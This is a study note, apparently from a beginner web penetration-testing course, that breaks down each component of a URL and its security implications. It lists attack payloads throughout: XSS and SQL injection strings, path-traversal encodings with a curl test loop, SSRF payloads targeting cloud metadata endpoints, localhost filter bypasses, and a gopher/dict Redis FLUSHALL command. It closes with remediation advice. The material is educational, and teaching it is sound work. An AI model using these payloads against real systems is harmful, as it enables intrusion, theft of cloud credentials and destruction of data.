---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.08 URLs — Anatomy"
---

# 02.08 — URLs — Anatomy

## What is it?

A **URL (Uniform Resource Locator)** is the address that identifies a resource on the web. Every part of a URL is a potential attack vector — scheme, host, port, path, query string, and fragment all have security implications.

---

## URL Anatomy — Complete Breakdown

```
https://user:pass@target.com:8443/api/v2/users/123?sort=name&page=1#section
│       │         │          │    │         │    │  │              │  │
│       │         │          │    │         │    │  │              │  └ Fragment
│       │         │          │    │         │    │  │              └─── Query string
│       │         │          │    │         │    │  └────────────────── Separator ?
│       │         │          │    │         │    └───────────────────── Resource ID
│       │         │          │    │         └────────────────────────── Path segment
│       │         │          │    └──────────────────────────────────── Path /api/v2/users/123
│       │         │          └───────────────────────────────────────── Port
│       │         └──────────────────────────────────────────────────── Host
│       └────────────────────────────────────────────────────────────── Credentials (user:pass)
└────────────────────────────────────────────────────────────────────── Scheme

WHAT GETS SENT TO THE SERVER:
  The server receives the REQUEST LINE:
    GET /api/v2/users/123?sort=name&page=1 HTTP/1.1
  AND the HOST HEADER:
    Host: target.com:8443
  Fragment (#section) stays in browser — NEVER sent to server
```

---

## Each Component in Detail

### Scheme

```
https://  → Use HTTPS (TLS encrypted, port 443 default)
http://   → Use HTTP (cleartext, port 80 default)
ftp://    → FTP protocol
file://   → Local file access
data:     → Inline data (data:text/html,<script>alert(1)</script>)
javascript: → Execute JS (javascript:alert(1)) ← XSS vector!
blob:     → Binary data
view-source: → View page source

VAPT USE OF SCHEMES:
  javascript:alert(1)     → XSS in href attributes
  file:///etc/passwd      → LFI in file inclusion
  ftp://internal/         → SSRF to internal FTP
  data:text/html,<script>alert(1)</script>  → CSP bypass
  dict://                 → SSRF to reach dict service
  gopher://               → SSRF to send raw TCP (POST to internal HTTP!)
```

### Host

```
Hostnames:
  target.com             → domain
  sub.target.com         → subdomain
  a.b.c.target.com       → multiple subdomain levels
  localhost              → loopback
  127.0.0.1              → loopback IP
  [::1]                  → IPv6 loopback
  0                      → shorthand for 0.0.0.0 (some parsers treat as localhost!)
  0.0.0.0                → all interfaces (sometimes treated as localhost)
  2130706433             → decimal for 127.0.0.1 (SSRF bypass!)
  0x7f000001             → hex for 127.0.0.1 (SSRF bypass!)
  127.1                  → shorthand for 127.0.0.1

VAPT USE:
  SSRF localhost bypass:
    http://127.0.0.1/    → blocked
    http://localhost/    → blocked
    http://127.1/        → sometimes bypasses filters!
    http://2130706433/   → sometimes bypasses!
    http://[::1]/        → IPv6 loopback bypass!
    http://0/            → resolves to localhost on some systems!
```

### Port

```
Default ports (omitted from URL when using defaults):
  http://target.com/      → port 80 implied
  https://target.com/     → port 443 implied

Non-default ports:
  https://target.com:8443/   → custom HTTPS
  http://target.com:8080/    → dev server
  http://target.com:3000/    → Node.js app
  http://target.com:9200/    → Elasticsearch!
  http://target.com:27017/   → MongoDB!

VAPT USE (SSRF port scanning):
  http://internal-host:22/    → is SSH open?
  http://internal-host:3306/  → is MySQL open?
  http://internal-host:6379/  → is Redis open?
  http://internal-host:9200/  → Elasticsearch with no auth?
```

### Path

```
The resource path identifies what you're accessing:
  /                         → root
  /users/123                → user with ID 123
  /api/v2/admin             → admin endpoint
  /upload/filename.jpg      → uploaded file

PATH TRAVERSAL ATTACKS:
  /files/report.pdf         → intended
  /files/../../../etc/passwd → traverse up directories

PATH TRAVERSAL ENCODINGS:
  ../           → standard
  ..%2f         → URL encoded /
  %2e%2e/       → URL encoded ..
  %2e%2e%2f     → both encoded
  ..%252f       → double URL encoded (bypass WAF)
  ..%c0%af      → UTF-8 overlong encoding
  ....//        → if app strips ../ leaves ../

API VERSIONING IN PATH:
  /api/v1/users  → try /api/v2/users (different auth?)
  /api/v1/admin  → try /v1/admin, /admin, /api/admin
```

### Query String

```
Parameters after ?:
  ?id=123&sort=name&page=1
  ↑ Each key=value pair is an injection point

INJECTION ATTACKS VIA QUERY STRING:
  SQLi:    ?id=1' OR '1'='1
  XSS:     ?search=<script>alert(1)</script>
  SSRF:    ?url=http://169.254.169.254/
  Open redirect: ?next=https://evil.com
  SSTI:    ?name={{7*7}}
  XXE:     (usually body, but sometimes in param)
  Path traversal: ?file=../../../etc/passwd

PARAMETER POLLUTION:
  ?param=value1&param=value2
  → Which value does the server use? First? Last? Both?
  → WAF might check value1 (safe), but server uses value2 (malicious)
  
  ?id=1&id=2
  ?id[]=1&id[]=2  ← array notation (PHP)
```

### Fragment

```
#section-name

Fragment NEVER sent to server — stays in browser only!
Used by single-page apps to track state client-side.

VAPT USE:
  Client-side XSS:
    https://target.com/#<script>alert(1)</script>
    If the app reads location.hash and puts it in the DOM → DOM XSS!
  
  Angular/React/Vue:
    https://target.com/#/admin   → client-side routing
    If client-side auth check → bypass by modifying hash
```

---

## Security Context — URLs in VAPT

### Full SSRF Payload Guide via URL Components

```
Testing SSRF (see [[Module 13 - SSRF]] for full coverage):

Target: https://target.com/fetch?url=INJECT_HERE

Cloud metadata:
  http://169.254.169.254/latest/meta-data/
  http://metadata.google.internal/computeMetadata/v1/
  http://169.254.169.254/metadata/instance?api-version=2021-02-01

Internal services:
  http://localhost/
  http://127.0.0.1/
  http://[::1]/
  http://192.168.1.1/

SSRF bypass techniques:
  http://2130706433/         → decimal IP for 127.0.0.1
  http://0x7f000001/         → hex IP
  http://127.0.0.1.xip.io/  → DNS that resolves to 127.0.0.1
  http://attacker.com@127.0.0.1/  → @ parsing confusion

Dangerous schemes for SSRF:
  file:///etc/passwd         → read local files
  gopher://127.0.0.1:6379/_FLUSHALL%0d%0a  → Redis command!
  dict://127.0.0.1:6379/FLUSHALL            → Dict protocol → Redis
```

---

## Hands-On: URL Testing

```bash
# Decode a URL-encoded string
python3 -c "import urllib.parse; print(urllib.parse.unquote('%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'))"
# → ../../etc/passwd

# Encode for URL
python3 -c "import urllib.parse; print(urllib.parse.quote('../../../etc/passwd'))"
# → ..%2F..%2F..%2Fetc%2Fpasswd

# Test path traversal
for payload in "../" "..%2f" "%2e%2e/" "%2e%2e%2f" "..%252f"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/files/${payload}etc/passwd")
  echo "$payload: $code"
done

# Test parameter pollution
curl "https://target.com/api/user?id=123&id=456"
curl "https://target.com/api/user?id[]=123&id[]=456"  # PHP array
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Path traversal via URL | Normalize paths server-side before access, use allowlist |
| SSRF via URL parameter | Validate/allowlist destination URLs, block RFC1918 |
| Open redirect via URL param | Allowlist redirect destinations or use relative paths only |
| Fragment-based DOM XSS | Sanitize location.hash before inserting into DOM |
| Credentials in URL (user:pass@) | Never put credentials in URLs (appear in logs, Referer) |

---

## Related Notes
- [[09 - Query Strings and Parameters]] — parameter injection deep dive
- [[10 - URL Encoding and Percent Encoding]] — encoding tricks
- [[Module 13 - SSRF]] — SSRF via URL manipulation
- [[Module 16 - Path Traversal]] — path traversal attacks
- [[Module 08 - Open Redirect]] — redirect parameter abuse
